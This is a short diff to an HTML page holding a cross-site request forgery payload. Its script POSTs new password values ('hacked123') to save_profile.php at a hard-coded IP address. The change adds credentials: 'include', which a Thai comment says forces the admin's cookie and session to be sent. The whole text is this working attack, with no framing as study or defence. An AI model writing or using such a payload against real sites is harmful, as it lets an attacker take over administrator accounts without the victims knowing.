@@ -6,13 +6,13 @@
   <body>
     <script>
       var formData = new FormData();
-      formData.append('password', 'password');
-      formData.append('cpassword', 'password');
+      formData.append('password', 'hacked123');
+      formData.append('cpassword', 'hacked123');
 
       fetch('http://34.126.103.102/save_profile.php', {
         method: 'POST',
         body: formData,
-        mode: 'no-cors'
+        credentials: 'include' // บังคับแนบ Cookie/Session ของ Admin ไปด้วย
       });
     </script>
   </body>
